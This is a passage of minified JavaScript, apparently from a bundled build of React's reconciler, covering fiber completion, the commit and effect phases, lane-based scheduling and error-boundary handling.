10:return Ml(n.type._context),ge(n),null;case 17:return Ce(n.type)&&Ur(),ge(n),null;case 19:if(X(Q),i=n.memoizedState,i===null)return ge(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)Zt(i,!1);else{if(le!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=qr(e),a!==null){for(n.flags|=128,Zt(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return Y(Q,Q.current&1|2),n.child}e=e.sibling}i.tail!==null&&ne()>Bt&&(n.flags|=128,s=!0,Zt(i,!1),n.lanes=4194304)}else{if(!s)if(e=qr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Zt(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!K)return ge(n),null}else 2*ne()-i.renderingStartTime>Bt&&t!==1073741824&&(n.flags|=128,s=!0,Zt(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=ne(),n.sibling=null,t=Q.current,Y(Q,s?t&1|2:t&1),n):(ge(n),null);case 22:case 23:return Kl(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Ae&1073741824&&(ge(n),n.subtreeFlags&6&&(n.flags|=8192)):ge(n),null;case 24:return null;case 25:return null}throw Error(A(156,n.tag))}function lm(e,n){switch(Ll(n),n.tag){case 1:return Ce(n.type)&&Ur(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Dt(),X(Te),X(ve),Bl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return jl(n),null;case 13:if(X(Q),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(A(340));It()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return X(Q),null;case 4:return Dt(),null;case 10:return Ml(n.type._context),null;case 22:case 23:return Kl(),null;case 24:return null;default:return null}}var cr=!1,ye=!1,om=typeof WeakSet=="function"?WeakSet:Set,z=null;function xt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){ee(e,n,s)}else t.current=null}function Va(e,n,t){try{t()}catch(s){ee(e,n,s)}}var fc=!1;function cm(e,n){if(Ta=Dr,e=ep(),Pl(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,u=0,d=e,h=null;n:for(;;){for(var y;d!==t||r!==0&&d.nodeType!==3||(l=a+r),d!==i||s!==0&&d.nodeType!==3||(o=a+s),d.nodeType===3&&(a+=d.nodeValue.length),(y=d.firstChild)!==null;)h=d,d=y;for(;;){if(d===e)break n;if(h===t&&++c===r&&(l=a),h===i&&++u===s&&(o=a),(y=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=y}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(Ca={focusedElem:e,selectionRange:t},Dr=!1,z=n;z!==null;)if(n=z,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,z=e;else for(;z!==null;){n=z;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var x=k.memoizedProps,L=k.memoizedState,p=n.stateNode,f=p.getSnapshotBeforeUpdate(n.elementType===n.type?x:We(n.type,x),L);p.__reactInternalSnapshotBeforeUpdate=f}break;case 3:var m=n.stateNode.containerInfo;m.nodeType===1?m.textContent="":m.nodeType===9&&m.documentElement&&m.removeChild(m.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(A(163))}}catch(S){ee(n,n.return,S)}if(e=n.sibling,e!==null){e.return=n.return,z=e;break}z=n.return}return k=fc,fc=!1,k}function fs(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Va(n,t,i)}r=r.next}while(r!==s)}}function vi(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Wa(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function Kp(e){var n=e.alternate;n!==null&&(e.alternate=null,Kp(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[en],delete n[Cs],delete n[La],delete n[$f],delete n[Gf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Qp(e){return e.tag===5||e.tag===3||e.tag===4}function mc(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Qp(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function $a(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Fr));else if(s!==4&&(e=e.child,e!==null))for($a(e,n,t),e=e.sibling;e!==null;)$a(e,n,t),e=e.sibling}function Ga(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Ga(e,n,t),e=e.sibling;e!==null;)Ga(e,n,t),e=e.sibling}var de=null,$e=!1;function wn(e,n,t){for(t=t.child;t!==null;)Zp(e,n,t),t=t.sibling}function Zp(e,n,t){if(nn&&typeof nn.onCommitFiberUnmount=="function")try{nn.onCommitFiberUnmount(ui,t)}catch{}switch(t.tag){case 5:ye||xt(t,n);case 6:var s=de,r=$e;de=null,wn(e,n,t),de=s,$e=r,de!==null&&($e?(e=de,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):de.removeChild(t.stateNode));break;case 18:de!==null&&($e?(e=de,t=t.stateNode,e.nodeType===8?$i(e.parentNode,t):e.nodeType===1&&$i(e,t),xs(e)):$i(de,t.stateNode));break;case 4:s=de,r=$e,de=t.stateNode.containerInfo,$e=!0,wn(e,n,t),de=s,$e=r;break;case 0:case 11:case 14:case 15:if(!ye&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&Va(t,n,a),r=r.next}while(r!==s)}wn(e,n,t);break;case 1:if(!ye&&(xt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){ee(t,n,l)}wn(e,n,t);break;case 21:wn(e,n,t);break;case 22:t.mode&1?(ye=(s=ye)||t.memoizedState!==null,wn(e,n,t),ye=s):wn(e,n,t);break;default:wn(e,n,t)}}function gc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new om),n.forEach(function(s){var r=vm.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function Ve(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:de=l.stateNode,$e=!1;break e;case 3:de=l.stateNode.containerInfo,$e=!0;break e;case 4:de=l.stateNode.containerInfo,$e=!0;break e}l=l.return}if(de===null)throw Error(A(160));Zp(i,a,r),de=null,$e=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){ee(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)Jp(n,e),n=n.sibling}function Jp(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Ve(n,e),Ze(e),s&4){try{fs(3,e,e.return),vi(3,e)}catch(x){ee(e,e.return,x)}try{fs(5,e,e.return)}catch(x){ee(e,e.return,x)}}break;case 1:Ve(n,e),Ze(e),s&512&&t!==null&&xt(t,t.return);break;case 5:if(Ve(n,e),Ze(e),s&512&&t!==null&&xt(t,t.return),e.flags&32){var r=e.stateNode;try{vs(r,"")}catch(x){ee(e,e.return,x)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&bu(r,i),ga(l,a);var c=ga(l,i);for(a=0;a<o.length;a+=2){var u=o[a],d=o[a+1];u==="style"?Tu(r,d):u==="dangerouslySetInnerHTML"?_u(r,d):u==="children"?vs(r,d):ml(r,u,d,c)}switch(l){case"input":pa(r,i);break;case"textarea":xu(r,i);break;case"select":var h=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var y=i.value;y!=null?Et(r,!!i.multiple,y,!1):h!==!!i.multiple&&(i.defaultValue!=null?Et(r,!!i.multiple,i.defaultValue,!0):Et(r,!!i.multiple,i.multiple?[]:"",!1))}r[Cs]=i}catch(x){ee(e,e.return,x)}}break;case 6:if(Ve(n,e),Ze(e),s&4){if(e.stateNode===null)throw Error(A(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(x){ee(e,e.return,x)}}break;case 3:if(Ve(n,e),Ze(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{xs(n.containerInfo)}catch(x){ee(e,e.return,x)}break;case 4:Ve(n,e),Ze(e);break;case 13:Ve(n,e),Ze(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(ql=ne())),s&4&&gc(e);break;case 22:if(u=t!==null&&t.memoizedState!==null,e.mode&1?(ye=(c=ye)||u,Ve(n,e),ye=c):Ve(n,e),Ze(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(z=e,u=e.child;u!==null;){for(d=z=u;z!==null;){switch(h=z,y=h.child,h.tag){case 0:case 11:case 14:case 15:fs(4,h,h.return);break;case 1:xt(h,h.return);var k=h.stateNode;if(typeof k.componentWillUnmount=="function"){s=h,t=h.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(x){ee(s,t,x)}}break;case 5:xt(h,h.return);break;case 22:if(h.memoizedState!==null){vc(d);continue}}y!==null?(y.return=h,z=y):vc(d)}u=u.sibling}e:for(u=null,d=e;;){if(d.tag===5){if(u===null){u=d;try{r=d.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=d.stateNode,o=d.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Eu("display",a))}catch(x){ee(e,e.return,x)}}}else if(d.tag===6){if(u===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(x){ee(e,e.return,x)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===e)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===e)break e;for(;d.sibling===null;){if(d.return===null||d.return===e)break e;u===d&&(u=null),d=d.return}u===d&&(u=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:Ve(n,e),Ze(e),s&4&&gc(e);break;case 21:break;default:Ve(n,e),Ze(e)}}function Ze(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(Qp(t)){var s=t;break e}t=t.return}throw Error(A(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(vs(r,""),s.flags&=-33);var i=mc(e);Ga(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=mc(e);$a(e,l,a);break;default:throw Error(A(161))}}catch(o){ee(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function um(e,n,t){z=e,ed(e)}function ed(e,n,t){for(var s=(e.mode&1)!==0;z!==null;){var r=z,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||cr;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||ye;l=cr;var c=ye;if(cr=a,(ye=o)&&!c)for(z=r;z!==null;)a=z,o=a.child,a.tag===22&&a.memoizedState!==null?wc(r):o!==null?(o.return=a,z=o):wc(r);for(;i!==null;)z=i,ed(i),i=i.sibling;z=r,cr=l,ye=c}yc(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,z=i):yc(e)}}function yc(e){for(;z!==null;){var n=z;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:ye||vi(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!ye)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:We(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&nc(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}nc(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var d=u.dehydrated;d!==null&&xs(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(A(163))}ye||n.flags&512&&Wa(n)}catch(h){ee(n,n.return,h)}}if(n===e){z=null;break}if(t=n.sibling,t!==null){t.return=n.return,z=t;break}z=n.return}}function vc(e){for(;z!==null;){var n=z;if(n===e){z=null;break}var t=n.sibling;if(t!==null){t.return=n.return,z=t;break}z=n.return}}function wc(e){for(;z!==null;){var n=z;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{vi(4,n)}catch(o){ee(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){ee(n,r,o)}}var i=n.return;try{Wa(n)}catch(o){ee(n,i,o)}break;case 5:var a=n.return;try{Wa(n)}catch(o){ee(n,a,o)}}}catch(o){ee(n,n.return,o)}if(n===e){z=null;break}var l=n.sibling;if(l!==null){l.return=n.return,z=l;break}z=n.return}}var pm=Math.ceil,Qr=vn.ReactCurrentDispatcher,Gl=vn.ReactCurrentOwner,Be=vn.ReactCurrentBatchConfig,H=0,pe=null,re=null,he=0,Ae=0,St=Hn(0),le=0,Os=null,it=0,wi=0,Yl=0,ms=null,Se=null,ql=0,Bt=1/0,ln=null,Zr=!1,Ya=null,In=null,ur=!1,Pn=null,Jr=0,gs=0,qa=null,Er=-1,Tr=0;function ke(){return H&6?ne():Er!==-1?Er:Er=ne()}function zn(e){return e.mode&1?H&2&&he!==0?he&-he:qf.transition!==null?(Tr===0&&(Tr=ju()),Tr):(e=$,e!==0||(e=window.event,e=e===void 0?16:$u(e.type)),e):1}function Xe(e,n,t,s){if(50<gs)throw gs=0,qa=null,Error(A(185));Us(e,t,s),(!(H&2)||e!==pe)&&(e===pe&&(!(H&2)&&(wi|=t),le===4&&En(e,he)),Pe(e,s),t===1&&H===0&&!(n.mode&1)&&(Bt=ne()+500,mi&&Vn()))}function Pe(e,n){var t=e.callbackNode;Yh(e,n);var s=zr(e,e===pe?he:0);if(s===0)t!==null&&Po(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Po(t),n===1)e.tag===0?Yf(kc.bind(null,e)):up(kc.bind(null,e)),Vf(function(){!(H&6)&&Vn()}),t=null;else{switch(Bu(s)){case 1:t=kl;break;case 4:t=zu;break;case 16:t=Ir;break;case 536870912:t=Du;break;default:t=Ir}t=od(t,nd.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function nd(e,n){if(Er=-1,Tr=0,H&6)throw Error(A(327));var t=e.callbackNode;if(Lt()&&e.callbackNode!==t)return null;var s=zr(e,e===pe?he:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=ei(e,s);else{n=s;var r=H;H|=2;var i=sd();(pe!==e||he!==n)&&(ln=null,Bt=ne()+500,Jn(e,n));do try{fm();break}catch(l){td(e,l)}while(!0);Ol(),Qr.current=i,H=r,re!==null?n=0:(pe=null,he=0,n=le)}if(n!==0){if(n===2&&(r=ba(e),r!==0&&(s=r,n=Xa(e,r))),n===1)throw t=Os,Jn(e,0),En(e,s),Pe(e,ne()),t;if(n===6)En(e,s);else{if(r=e.current.alternate,!(s&30)&&!dm(r)&&(n=ei(e,s),n===2&&(i=ba(e),i!==0&&(s=i,n=Xa(e,i))),n===1))throw t=Os,Jn(e,0),En(e,s),Pe(e,ne()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(A(345));case 2:qn(e,Se,ln);break;case 3:if(En(e,s),(s&130023424)===s&&(n=ql+500-ne(),10<n)){if(zr(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){ke(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Aa(qn.bind(null,e,Se,ln),n);break}qn(e,Se,ln);break;case 4:if(En(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-qe(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=ne()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*pm(s/1960))-s,10<s){e.timeoutHandle=Aa(qn.bind(null,e,Se,ln),s);break}qn(e,Se,ln);break;case 5:qn(e,Se,ln);break;default:throw Error(A(329))}}}return Pe(e,ne()),e.callbackNode===t?nd.bind(null,e):null}function Xa(e,n){var t=ms;return e.current.memoizedState.isDehydrated&&(Jn(e,n).flags|=256),e=ei(e,n),e!==2&&(n=Se,Se=t,n!==null&&Ka(n)),e}function Ka(e){Se===null?Se=e:Se.push.apply(Se,e)}function dm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!Ke(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function En(e,n){for(n&=~Yl,n&=~wi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-qe(n),s=1<<t;e[t]=-1,n&=~s}}function kc(e){if(H&6)throw Error(A(327));Lt();var n=zr(e,0);if(!(n&1))return Pe(e,ne()),null;var t=ei(e,n);if(e.tag!==0&&t===2){var s=ba(e);s!==0&&(n=s,t=Xa(e,s))}if(t===1)throw t=Os,Jn(e,0),En(e,n),Pe(e,ne()),t;if(t===6)throw Error(A(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,qn(e,Se,ln),Pe(e,ne()),null}function Xl(e,n){var t=H;H|=1;try{return e(n)}finally{H=t,H===0&&(Bt=ne()+500,mi&&Vn())}}function at(e){Pn!==null&&Pn.tag===0&&!(H&6)&&Lt();var n=H;H|=1;var t=Be.transition,s=$;try{if(Be.transition=null,$=1,e)return e()}finally{$=s,Be.transition=t,H=n,!(H&6)&&Vn()}}function Kl(){Ae=St.current,X(St)}function Jn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Hf(t)),re!==null)for(t=re.return;t!==null;){var s=t;switch(Ll(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Ur();break;case 3:Dt(),X(Te),X(ve),Bl();break;case 5:jl(s);break;case 4:Dt();break;case 13:X(Q);break;case 19:X(Q);break;case 10:Ml(s.type._context);break;case 22:case 23:Kl()}t=t.return}if(pe=e,re=e=Dn(e.current,null),he=Ae=n,le=0,Os=null,Yl=wi=it=0,Se=ms=null,Kn!==null){for(n=0;n<Kn.length;n++)if(t=Kn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Kn=null}return e}function td(e,n){do{var t=re;try{if(Ol(),xr.current=Kr,Xr){for(var s=Z.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Xr=!1}if(rt=0,ue=ae=Z=null,hs=!1,Ls=0,Gl.current=null,t===null||t.return===null){le=1,Os=n,re=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=he,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,u=l,d=u.tag;if(!(u.mode&1)&&(d===0||d===11||d===15)){var h=u.alternate;h?(u.updateQueue=h.updateQueue,u.memoizedState=h.memoizedState,u.lanes=h.lanes):(u.updateQueue=null,u.memoizedState=null)}var y=lc(a);if(y!==null){y.flags&=-257,oc(y,a,l,i,n),y.mode&1&&ac(i,c,n),n=y,o=c;var k=n.updateQueue;if(k===null){var x=new Set;x.add(o),n.updateQueue=x}else k.add(o);break e}else{if(!(n&1)){ac(i,c,n),Ql();break e}o=Error(A(426))}}else if(K&&l.mode&1){var L=lc(a);if(L!==null){!(L.flags&65536)&&(L.flags|=256),oc(L,a,l,i,n),Nl(jt(o,l));break e}}i=o=jt(o,l),le!==4&&(le=2),ms===null?ms=[i]:ms.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var p=Bp(i,o,n);ec(i,p);break e;case 1:l=o;var f=i.type,m=i.stateNode;if(!(i.flags&128)&&(typeof f.getDerivedStateFromError=="function"||m!==null&&typeof m.componentDidCatch=="function"&&(In===null||!In.has(m)))){i.flags|=65536,n&=-n,i.lanes|=n;var S=Fp(i,l,n);ec(i,S);break e}}i=i.return}while(i!==null)}id(t)}catch(T){n=T,re===t&&t!==null&&(re=t=t.return);continue}break}while(!0)}function sd(){var e=Qr.current;return Qr.current=Kr,e===null?Kr:e}function Ql(){(le===0||le===3||le===2)&&(le=4),pe===null||!(it&268435455)&&!(wi&268435455)||En(pe,he)}function ei(e,n){var t=H;H|=2;var s=sd();(pe!==e||he!==n)&&(ln=null,Jn(e,n));do try{hm();break}catch(r){td(e,r)}while(!0);if(Ol(),H=t,Qr.current=s,re!==null)throw Error(A(261));return pe=null,he=0,le}function hm(){for(;re!==null;)rd(re)}function fm(){for(;re!==null&&!jh();)rd(re)}function rd(e){var n=ld(e.alternate,e,Ae);e.memoizedProps=e.pendingProps,n===null?id(e):re=n,Gl.current=null}function id(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=lm(t,n),t!==null){t.flags&=32767,re=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{le=6,re=null;return}}else if(t=am(t,n,Ae),t!==null){re=t;return}if(n=n.sibling,n!==null){re=n;return}re=n=e}while(n!==null);le===0&&(le=5)}function qn(e,n,t){var s=$,r=Be.transition;try{Be.transition=null,$=1,mm(e,n,t,s)}finally{Be.transition=r,$=s}return null}function mm(e,n,t,s){do Lt();while(Pn!==null);if(H&6)throw Error(A(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(A(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(qh(e,i),e===pe&&(re=pe=null,he=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||ur||(ur=!0,od(Ir,function(){return Lt(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Be.transition,Be.transition=null;var a=$;$=1;var l=H;H|=4,Gl.current=null,cm(e,t),Jp(t,e),If(Ca),Dr=!!Ta,Ca=Ta=null,e.current=t,um(t),Bh(),H=l,$=a,Be.transition=i}else e.current=t;if(ur&&(ur=!1,Pn=e,Jr=r),i=e.pendingLanes,i===0&&(In=null),Hh(t.stateNode),Pe(e,ne()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(Zr)throw Zr=!1,e=Ya,Ya=null,e;return Jr&1&&e.tag!==0&&Lt(),i=e.pendingLanes,i&1?e===qa?gs++:(gs=0,qa=e):gs=0,Vn(),null}function Lt(){if(Pn!==null){var e=Bu(Jr),n=Be.transition,t=$;try{if(Be.transition=null,$=16>e?16:e,Pn===null)var s=!1;else{if(e=Pn,Pn=null,Jr=0,H&6)throw Error(A(331));var r=H;for(H|=4,z=e.current;z!==null;){var i=z,a=i.child;if(z.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(z=c;z!==null;){var u=z;switch(u.tag){case 0:case 11:case 15:fs(8,u,i)}var d=u.child;if(d!==null)d.return=u,z=d;else for(;z!==null;){u=z;var h=u.sibling,y=u.return;if(Kp(u),u===c){z=null;break}if(h!==null){h.return=y,z=h;break}z=y}}}var k=i.alternate;if(k!==null){var x=k.child;if(x!==null){k.child=null;do{var L=x.sibling;x.sibling=null,x=L}while(x!==null)}}z=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,z=a;else e:for(;z!==null;){if(i=z,i.flags&2048)switch(i.tag){case 0:case 11:case 15:fs(9,i,i.return)}var p=i.sibling;if(p!==null){p.return=i.return,z=p;break e}z=i.return}}var f=e.current;for(z=f;z!==null;){a=z;var m=a.child;if(a.subtreeFlags&2064&&m!==null)m.return=a,z=m;else e:for(a=f;z!==null;){if(l=z,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:vi(9,l)}}catch(T){ee(l,l.return,T)}if(l===a){z=null;break e}var S=l.sibling;if(S!==null){S.return=l.return,z=S;break e}z=l.return}}if(H=r,Vn(),nn&&typeof nn.onPostCommitFiberRoot=="function")try{nn.onPostCommitFiberRoot(ui,e)}catch{}s=!0}return s}finally{$=t,Be.transition=n}}return!1}function bc(e,n,t){n=jt(t,n),n=Bp(e,n,1),e=Mn(e,n,1),n=ke(),e!==null&&(Us(e,1,n),Pe(e,n))}function ee(e,n,t){if(e.tag===3)bc(e,e,t);else for(;n!==null;){if(n.tag===3){bc(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(In===null||!In.has(s))){e=jt(t,e),e=Fp(n,e,1),n=Mn(n,e,1),e=ke(),n!==null&&(Us(n,1,e),Pe(n,e));break}}n=n.return}}function gm(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=ke(),e.pingedLanes|=e.suspendedLanes&t,pe===e&&(he&t)===t&&(le===4||le===3&&(he&130023424)===he&&500>ne()-ql?Jn(e,0):Yl|=t),Pe(e,n)}function ad(e,n){n===0&&(e.mode&1?(n=er,er<<=1,!(er&130023424)&&(er=4194304)):n=1);var t=ke();e=mn(e,n),e!==null&&(Us(e,n,t),Pe(e,t))}function ym(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),ad(e,t)}function vm(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(A(314))}s!==null&&s.delete(n),ad(e,t)}var ld;ld=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Te.current)_e=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return _e=!1,im(e,n,t);_e=!!(e.flags&131072)}else _e=!1,K&&n.flags&1048576&&pp(n,Wr,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;_r(e,n),e=n.pendingProps;var r=Mt(n,ve.current);At(n,t),r=Ul(null,n,s,e,r,t);var i=Hl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Ce(s)?(i=!0,Hr(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,zl(n),r.updater=yi,n.stateNode=r,r._reactInternals=n,za(n,s,e,t),n=Ba(null,n,s,!0,i,t)):(n.tag=0,K&&i&&Al(n),we(null,n,r,t),n=n.child),n;case 